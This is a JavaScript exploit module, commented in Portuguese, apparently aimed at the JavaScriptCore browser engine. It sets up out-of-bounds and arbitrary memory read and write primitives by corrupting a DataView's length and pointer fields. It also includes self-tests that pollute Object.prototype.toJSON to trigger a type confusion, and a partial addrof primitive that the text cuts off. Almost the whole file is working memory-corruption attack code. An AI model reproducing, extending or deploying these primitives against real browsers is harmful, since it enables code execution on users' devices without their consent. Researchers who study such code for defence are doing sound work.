// js/core_exploit.mjs (v31.2 - Depuração Avançada em oob_read_absolute e selfTestOOBReadWrite)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => {
    if (isAdvancedInt64Object(val)) {
        return val.toString(true);
    }
    if (typeof val === 'number') {
        return toHex(val, bits);
    }
    return String(val);
};

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    isOOBEnvironmentSetup = false;
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}

export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        let currentLength = 0;
        try {
            if(oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
                currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true);
            }
        } catch(e){ /* ignora */ }

        if (oob_array_buffer_real && oob_dataview_real &&
            oob_array_buffer_real.byteLength === getOOBAllocationSize() &&
            oob_dataview_real.buffer === oob_array_buffer_real &&
            currentLength === 0xFFFFFFFF) {
            return true;
        } else {
            log(`Ambiente OOB marcado como configurado, mas inconsistente/não expandido. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }
    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();
    log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
            log(`    m_length do oob_dataview_real expandido para 0xFFFFFFFF no offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`, 'info', FNAME_TRIGGER);
        } else {
            const errorMsg = `Falha ao expandir m_length: currentAllocSize (${currentAllocSize}) é muito pequeno para o offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`;
            log(errorMsg, 'critical', FNAME_TRIGGER);
            throw new Error(errorMsg);
        }
        
        log(`Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
        log(`    oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        log(`    oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true)} bytes (m_length expandido)`, 'info', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true;
        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) {
    const FNAME_READ = 'CoreExploit.oob_read_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_read_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_READ);
        throw new Error("Ambiente OOB não inicializado/inválido para oob_read_absolute.");
    }
    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_array_buffer_real.byteLength) {
        const errorMsg = `oob_read_absolute (offset ${toHex(offset_in_oob_buffer)}, tam ${byteLength}) fora dos limites do oob_array_buffer_real (0-${oob_array_buffer_real.byteLength})`;
        log(errorMsg, "error", FNAME_READ);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(offset_in_oob_buffer);
            case 2: return oob_dataview_real.getUint16(offset_in_oob_buffer, true);
            case 4: return oob_dataview_real.getUint32(offset_in_oob_buffer, true);
            case 8: {
                const low = oob_dataview_real.getUint32(offset_in_oob_buffer, true);
                const high = oob_dataview_real.getUint32(offset_in_oob_buffer + 4, true);
                // *** INÍCIO DA DEPURAÇÃO EM oob_read_absolute ***
                log(`[${FNAME_READ}] DEBUG 64bit: offset=${toHex(offset_in_oob_buffer)}, low_raw=0x${low.toString(16)}, high_raw=0x${high.toString(16)}`, 'debug');
                const result = new AdvancedInt64(low, high);
                log(`[${FNAME_READ}] DEBUG 64bit: About to return AdvancedInt64. IsObject: ${isAdvancedInt64Object(result)}. Value: ${result.toString(true)}`, 'debug');
                // *** FIM DA DEPURAÇÃO ***
                return result;
            }
            default:
                log(`ERRO: Tamanho de leitura inválido para oob_read_absolute: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid byteLength for oob_read_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_READ} ao ler de oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_READ);
        console.error(`[${FNAME_READ}] Exception: `, e); // Logar a exceção completa
        if (e.message.includes("detached")) { isOOBEnvironmentSetup = false; }
        throw e;
    }
}

export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) {
    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_write_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_WRITE);
        throw new Error("Ambiente OOB não inicializado/inválido para oob_write_absolute.");
    }
    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_array_buffer_real.byteLength) {
        const errorMsg = `oob_write_absolute (offset ${toHex(offset_in_oob_buffer)}, tam ${byteLength}) fora dos limites do oob_array_buffer_real (0-${oob_array_buffer_real.byteLength})`;
        log(errorMsg, "error", FNAME_WRITE);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(offset_in_oob_buffer, Number(value)); break;
            case 2: oob_dataview_real.setUint16(offset_in_oob_buffer, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(offset_in_oob_buffer, Number(value), true); break;
            case 8:
                let val64 = value;
                if (!isAdvancedInt64Object(val64)) {
                    // log(`[${FNAME_WRITE}] DEBUG 64bit: Value is not AdvancedInt64. Type: ${typeof val64}. Attempting conversion.`, 'debug');
                    try { val64 = new AdvancedInt64(val64); } catch (convErr) {
                        // log(`[${FNAME_WRITE}] DEBUG 64bit: Conversion failed: ${convErr.message}`, 'error');
                        throw new TypeError(`Valor para oob_write_absolute de 8 bytes deve ser AdvancedInt64 ou conversível: ${convErr.message}`);
                    }
                }
                // log(`[${FNAME_WRITE}] DEBUG 64bit: Writing AdvInt64: ${val64.toString(true)} (low: ${toHex(val64.low())}, high: ${toHex(val64.high())}) to offset ${toHex(offset_in_oob_buffer)}`, 'debug');
                oob_dataview_real.setUint32(offset_in_oob_buffer, val64.low(), true);
                oob_dataview_real.setUint32(offset_in_oob_buffer + 4, val64.high(), true);
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido para oob_write_absolute: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid byteLength for oob_write_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_WRITE} ao escrever em oob_buffer[${toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_WRITE);
        if (e.message.includes("detached")) { isOOBEnvironmentSetup = false; }
        throw e;
    }
}

export function isOOBReady() {
    let mLengthExpanded = false;
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real) {
        try {
            if (oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
                mLengthExpanded = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF);
            }
        } catch (e) { mLengthExpanded = false; }
    }
    return isOOBEnvironmentSetup &&
        oob_array_buffer_real instanceof ArrayBuffer &&
        oob_dataview_real instanceof DataView &&
        oob_array_buffer_real.byteLength > 0 &&
        oob_dataview_real.buffer === oob_array_buffer_real &&
        mLengthExpanded;
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) {
    const FNAME_RESET = `${fname_parent_for_log}._explicit_dv_reset`;
    try {
        if (isOOBReady()){
            const temp_val = oob_read_absolute(0,1); 
            oob_write_absolute(0, temp_val, 1);
        }
    } catch (e) {
        log(`    [${FNAME_RESET}] ERRO durante o reset explícito do DV: ${e.message}`, 'error');
    }
}

export async function arb_read(absolute_address, byteLength) {
    const FNAME = 'CoreExploit.arb_read (v31.2)';
    if (!isOOBReady()) {
        await triggerOOB_primitive({force_reinit: true});
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para leitura arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!isAdvancedInt64Object(addr64)) {
        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para arb_read deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
    }

    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
    let result_val = null;
    try {
        // log(`[${FNAME}] DEBUG: Lendo metadados originais...`, 'debug');
        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        // log(`[${FNAME}] DEBUG: m_vector_orig_snap tipo: ${typeof m_vector_orig_snap}, é AdvInt64: ${isAdvancedInt64Object(m_vector_orig_snap)}, valor: ${isAdvancedInt64Object(m_vector_orig_snap) ? m_vector_orig_snap.toString(true) : String(m_vector_orig_snap)}`, 'debug');
        m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
        m_mode_orig_snap   = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
        
        // log(`[${FNAME}] DEBUG: Escrevendo novos metadados. Addr: ${addr64.toString(true)}`, 'debug');
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);

        // log(`[${FNAME}] DEBUG: Realizando leitura arbitrária...`, 'debug');
        switch (byteLength) {
            case 1: result_val = oob_dataview_real.getUint8(0); break;
            case 2: result_val = oob_dataview_real.getUint16(0, true); break;
            case 4: result_val = oob_dataview_real.getUint32(0, true); break;
            case 8: {
                const low = oob_dataview_real.getUint32(0, true);
                const high = oob_dataview_real.getUint32(4, true);
                result_val = new AdvancedInt64(low, high);
                break;
            }
            default: throw new Error(`Invalid byteLength for arb_read: ${byteLength}`);
        }
        // log(`[${FNAME}] DEBUG: Leitura arbitrária concluída. Valor: ${isAdvancedInt64Object(result_val) ? result_val.toString(true) : toHex(result_val)}`, 'debug');
        return result_val;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME} ao ler de ${addr64.toString(true)} (byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
        throw e;
    } finally {
        // log(`[${FNAME}] DEBUG: Bloco finally. Tentando restaurar metadados...`, 'debug');
        if (isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) {
            try {
                // log(`[${FNAME}] DEBUG: Restaurando m_vector para ${m_vector_orig_snap.toString(true)}`, 'debug');
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME);
                // log(`[${FNAME}] DEBUG: Metadados restaurados.`, 'debug');
            } catch (e_restore) {
                log(`ERRO ${FNAME} restaurando/resetando metadados: ${e_restore.message}`, 'critical');
                isOOBEnvironmentSetup = false;
            }
        } else if (isOOBReady()) {
            log(` ${FNAME} não pôde restaurar/resetar metadados (snapshots inválidos ou OOB não pronto). Ambiente pode estar instável. Snapshots: V_type=${typeof m_vector_orig_snap}, V_isAdvInt64=${isAdvancedInt64Object(m_vector_orig_snap)}, L=${m_length_orig_snap}, M=${m_mode_orig_snap}`, 'critical');
             isOOBEnvironmentSetup = false; // Considerar instável
        } else {
            // log(`[${FNAME}] DEBUG: Bloco finally - OOB não estava pronto, nada a restaurar.`, 'debug');
        }
    }
}

export async function arb_write(absolute_address, value, byteLength) {
    const FNAME = 'CoreExploit.arb_write (v31.2)';
    if (!isOOBReady()) {
        await triggerOOB_primitive({force_reinit: true});
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para escrita arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!isAdvancedInt64Object(addr64)) {
        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para arb_write deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
    }

    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
    try {
        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
        m_mode_orig_snap   = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
        
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);

        let val64_write;
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
            case 8:
                val64_write = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                oob_dataview_real.setUint32(0, val64_write.low(), true);
                oob_dataview_real.setUint32(4, val64_write.high(), true);
                break;
            default: throw new Error("Invalid byteLength para arb_write");
        }
    } finally {
        if (isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) {
            try {
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME);
            } catch (eR) {
                log(`ERRO ${FNAME} restaurando/resetando metadados: ${eR.message}`, 'critical');
                isOOBEnvironmentSetup = false;
            }
        } else if (isOOBReady()) {
             log(` ${FNAME} não pôde restaurar/resetar metadados (snapshots inválidos ou OOB não pronto). Ambiente pode estar instável. Snapshots: V_type=${typeof m_vector_orig_snap}, V_isAdvInt64=${isAdvancedInt64Object(m_vector_orig_snap)}, L=${m_length_orig_snap}, M=${m_mode_orig_snap}`, 'critical');
             isOOBEnvironmentSetup = false;
        }
    }
}

export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (v31.2 - com re-inicialização forçada) ---`, 'test', FNAME_TEST);
    let success32 = false;
    let success64 = false;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        const test_offset = 0x50; 
        const test_val32 = 0x11223344;
        currentLog(`    (32bit Test) Escrevendo ${toHex(test_val32)} em ${toHex(test_offset)}`, 'debug', FNAME_TEST);
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        currentLog(`    (32bit Test) Lido ${toHex(read_val32)} de ${toHex(test_offset)}`, 'debug', FNAME_TEST);

        if (read_val32 === test_val32) {
            currentLog(`    (32bit Test) SUCESSO: Lido ${toHex(read_val32)} corretamente.`, "good", FNAME_TEST);
            success32 = true;
        } else {
            currentLog(`    (32bit Test) FALHA: Lido ${toHex(read_val32)}, esperado ${toHex(test_val32)}.`, "error", FNAME_TEST);
        }

        const next_offset = test_offset + 16; // Aumentar espaçamento para evitar sobreposição
        if (next_offset + 8 > oob_array_buffer_real.byteLength) {
            currentLog(`    (64bit Test) ERRO: Offset ${toHex(next_offset)} fora dos limites do buffer (${oob_array_buffer_real.byteLength})`, "error", FNAME_TEST);
            throw new Error("Offset para teste 64bit fora dos limites");
        }
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        currentLog(`    (64bit Test) Escrevendo ${test_val64.toString(true)} em ${toHex(next_offset)}`, 'debug', FNAME_TEST);
        oob_write_absolute(next_offset, test_val64, 8);
        
        // Adicionando log para os bytes brutos lidos antes de criar o AdvancedInt64
        const raw_low = oob_dataview_real.getUint32(next_offset, true);
        const raw_high = oob_dataview_real.getUint32(next_offset + 4, true);
        currentLog(`    (64bit Test) DEBUG: Raw low from DV: 0x${raw_low.toString(16)}, Raw high from DV: 0x${raw_high.toString(16)}`, 'debug', FNAME_TEST);

        const read_val64 = oob_read_absolute(next_offset, 8); // Esta chamada já tem logs internos agora
        currentLog(`    (64bit Test) Lido de ${toHex(next_offset)}. Tipo retornado: ${typeof read_val64}. É AdvancedInt64? ${isAdvancedInt64Object(read_val64)}`, 'debug', FNAME_TEST);
        
        if (isAdvancedInt64Object(read_val64)) {
            currentLog(`    (64bit Test) Valor lido (AdvInt64): ${read_val64.toString(true)}`, 'debug', FNAME_TEST);
            if (read_val64.equals(test_val64)) {
                currentLog(`    (64bit Test) SUCESSO: Lido ${read_val64.toString(true)} corretamente.`, "good", FNAME_TEST);
                success64 = true;
            } else {
                currentLog(`    (64bit Test) FALHA: Valor AdvancedInt64 não corresponde. Lido ${read_val64.toString(true)}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST);
            }
        } else {
            currentLog(`    (64bit Test) FALHA: Valor lido NÃO é um objeto AdvancedInt64. Valor: ${String(read_val64)} Esperado: ${test_val64.toString(true)}.`, "error", FNAME_TEST);
        }
        
        currentLog(`--- Auto-Teste de OOB R/W Concluído (32bit: ${success32}, 64bit: ${success64}) ---`, 'test', FNAME_TEST);
        return success32 && success64;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        console.error(`[${FNAME_TEST}] Exception: `, e);
        return false;
    }
}

// ... (resto do arquivo selfTestTypeConfusionAndMemoryControl e attemptAddrofUsingCoreHeisenbug permanecem os mesmos da v31.1) ...
// Para economizar espaço, não vou repetir as seções que não foram alteradas.
// Certifique-se de que elas estejam presentes no seu arquivo final.
// As principais modificações foram em oob_read_absolute, selfTestOOBReadWrite, e arb_read/write para adicionar depuração.

const HEISENBUG_OOB_DATAVIEW_METADATA_BASE = OOB_DV_METADATA_BASE_IN_OOB_BUFFER;
const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const HEISENBUG_CRITICAL_WRITE_OFFSET = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET;
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_VICTIM_AB_SIZE = 64;

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
    currentLog(`--- Iniciando Auto-Teste Combinado (v31.2): Type Confusion e Controle de Memória ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    let local_probe_details_for_selftest = null;
    let overallSuccess = false; // Inicia como false, só se torna true se todas as fases passarem.
    let tcPhaseSuccess = false;

    try {
        currentLog(`FASE 1: Testando Type Confusion (usando constantes HEISENBUG_*)...`, 'subtest', FNAME_TEST);
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
        }
        currentLog(`    (TC SelfTest) Alvo da corrupção OOB: ${toHex(HEISENBUG_CRITICAL_WRITE_OFFSET)}`, 'info', FNAME_TEST);
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        currentLog(`        (TC SelfTest) Escrita OOB crítica realizada.`, "info", FNAME_TEST);
        await PAUSE(100);

        let victim_ab_for_selftest = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE);
        currentLog(`    (TC SelfTest) victim_ab_for_selftest (tamanho ${HEISENBUG_VICTIM_AB_SIZE} bytes) criado.`, "info", FNAME_TEST);

        const toJSON_ProbeForSelfTest = function() {
            local_probe_details_for_selftest = {
                this_type_in_toJSON: Object.prototype.toString.call(this),
                is_victim_direct_ref: (this === victim_ab_for_selftest)
            };
             // Log para ver o que 'this' realmente é na sonda do autoteste
            // logS3(`    (TC SelfTest Probe) 'this' type: ${local_probe_details_for_selftest.this_type_in_toJSON}, is_victim_direct_ref: ${local_probe_details_for_selftest.is_victim_direct_ref}`, 'debug');
            return { self_test_probe_executed_tc: true, observed_this_type: local_probe_details_for_selftest.this_type_in_toJSON };
        };

        const ppKey_TC = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
        Object.defineProperty(Object.prototype, ppKey_TC, {
            value: toJSON_ProbeForSelfTest,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        currentLog(`            (TC SelfTest) Object.prototype.${ppKey_TC} poluído com sonda.`, "info", FNAME_TEST);
        
        let stringifyOutput_TC = JSON.stringify(victim_ab_for_selftest);
        currentLog(`            (TC SelfTest) JSON.stringify completou. Retorno da sonda: "${stringifyOutput_TC}"`, "info", FNAME_TEST);
        currentLog(`            (TC SelfTest) Detalhes da sonda: ${local_probe_details_for_selftest ? JSON.stringify(local_probe_details_for_selftest) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details_for_selftest && local_probe_details_for_selftest.this_type_in_toJSON === "[object Object]") {
            // Para este autoteste, se 'this' virou um [object Object], consideramos a TC ocorrida.
            // A checagem 'is_victim_direct_ref' é mais para entender o mecanismo exato do Heisenbug.
            currentLog(`    (TC SelfTest) SUCESSO (ou SUCESSO PARCIAL): Confusão de tipo detectada! 'this' é [object Object]. (is_victim_direct_ref: ${local_probe_details_for_selftest.is_victim_direct_ref})`, "vuln", FNAME_TEST);
            tcPhaseSuccess = true; // Marcamos sucesso para a fase de TC
        } else {
            let detailsMsg = local_probe_details_for_selftest ? `is_victim_direct_ref=${local_probe_details_for_selftest.is_victim_direct_ref}, type=${local_probe_details_for_selftest.this_type_in_toJSON}` : "sonda não forneceu detalhes";
            currentLog(`    (TC SelfTest) FALHA: Teste de Type Confusion. Detalhes: ${detailsMsg}. Esperado tipo [object Object].`, "error", FNAME_TEST);
            // overallSuccess permanece false
        }
    } catch (e) {
        currentLog(`ERRO na FASE 1 (Type Confusion - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        // overallSuccess permanece false
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            else delete Object.prototype['toJSON'];
            currentLog(`            (TC SelfTest) Object.prototype.toJSON restaurado.`, "info", FNAME_TEST);
            pollutionApplied = false;
            originalToJSONDescriptor = null;
        }
    }

    if (!tcPhaseSuccess) { 
        currentLog(`Teste de Type Confusion (SelfTest) falhou. Abortando teste de Controle de Memória.`, 'warn', FNAME_TEST);
    } else { 
        await PAUSE(200);
        currentLog(`FASE 2: Testando Controle de Memória...`, 'subtest', FNAME_TEST);
        let memoryControlPhaseSuccess = false;
        try {
            if (!isOOBReady()) {
                currentLog(`    (MC) Ambiente OOB não estava pronto. Reconfigurando...`, 'warn', FNAME_TEST);
                await triggerOOB_primitive({ force_reinit: true });
                if (!isOOBReady()) throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Memória.");
            }
            const OFFSET_M_LENGTH_TARGET = OOB_DV_M_LENGTH_OFFSET;
            const OFFSET_M_MODE_TARGET   = OOB_DV_M_MODE_OFFSET;
            
            const PLANT_M_LENGTH = 0xBABEFACE;
            const PLANT_M_MODE   = 0x00000001; // Um valor típico para m_mode
            
            currentLog(`    (MC) Configurando m_length e m_mode...`, 'info', FNAME_TEST);
            oob_write_absolute(OFFSET_M_LENGTH_TARGET, PLANT_M_LENGTH, 4);
            oob_write_absolute(OFFSET_M_MODE_TARGET, PLANT_M_MODE, 4);
            currentLog(`        m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}) para ${toHex(PLANT_M_LENGTH)}`, 'info', FNAME_TEST);
            currentLog(`        m_mode (@${toHex(OFFSET_M_MODE_TARGET)}) para ${toHex(PLANT_M_MODE)}`, 'info', FNAME_TEST);

            currentLog(`    (MC) Verificando valores plantados:`, 'info', FNAME_TEST);
            const read_m_length_val = oob_read_absolute(OFFSET_M_LENGTH_TARGET, 4);
            const read_m_mode_val   = oob_read_absolute(OFFSET_M_MODE_TARGET, 4);
            
            currentLog(`        Lido m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}): ${toHex(read_m_length_val)}`, "leak", FNAME_TEST);
            currentLog(`        Lido m_mode    (@${toHex(OFFSET_M_MODE_TARGET)}): ${toHex(read_m_mode_val)}`, "leak", FNAME_TEST);

            if (read_m_length_val === PLANT_M_LENGTH && read_m_mode_val === PLANT_M_MODE) {
                currentLog(`    (MC) SUCESSO: Controle de m_length e m_mode verificado!`, "vuln", FNAME_TEST);
                memoryControlPhaseSuccess = true;
            } else {
                 if (read_m_length_val !== PLANT_M_LENGTH) {
                    currentLog(`    (MC) FALHA: m_length lido (${toHex(read_m_length_val)}) não corresponde ao plantado (${toHex(PLANT_M_LENGTH)}).`, "error", FNAME_TEST);
                }
                if (read_m_mode_val !== PLANT_M_MODE) {
                    currentLog(`    (MC) FALHA: m_mode lido (${toHex(read_m_mode_val)}) não corresponde ao plantado (${toHex(PLANT_M_MODE)}).`, "error", FNAME_TEST);
                }
            }
        } catch (e) {
            currentLog(`ERRO na FASE 2 (Controle de Memória - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
            // memoryControlPhaseSuccess permanece false
        }
        if (tcPhaseSuccess && memoryControlPhaseSuccess) {
            overallSuccess = true; // Apenas se ambas as fases passarem
        }
    }

    currentLog(`--- Auto-Teste Combinado CONCLUÍDO ${overallSuccess ? 'COM SUCESSO' : 'COM FALHA'} ---`, 'test', FNAME_TEST);
    return overallSuccess;
}

let _targetObjectForAddrofProbe_core = null; // Renomeado para evitar conflito com outras variáveis globais
let _heisenbugConfirmedByProbe_core = false; // Renomeado

function _toJSONProbeForAddrofInCoreInternal() { // Renomeado para evitar conflito
    let currentThisType = Object.prototype.toString.call(this);
    // log(`[CoreAddrofProbeInternal] Tipo de 'this' observado: ${currentThisType}`, "leak", "CoreExploit._toJSONProbeForAddrofInCoreInternal");
    if (currentThisType === '[object Object]') {
        _heisenbugConfirmedByProbe_core = true;
        if (_targetObjectForAddrofProbe_core) {
            try { this[0] = _targetObjectForAddrofProbe_core; } catch (e_write) { 
                log(`[CoreAddrofProbeInternal] Erro ao tentar this[0] = target: ${e_write.message}`, 'warn');
            }
        }
    } else { _heisenbugConfirmedByProbe_core = false; }
    return { core_addrof_probe_executed: true, type_seen: currentThisType };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) {
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug";
    log(`[${FNAME_FUNC}] AVISO: Primitiva addrof (Heisenbug) é conhecida por falhar no ambiente atual. Tentando (v31.2)...`, "warn", FNAME_FUNC);
    _targetObjectForAddrofProbe_core = targetObject; // Usa variável renomeada
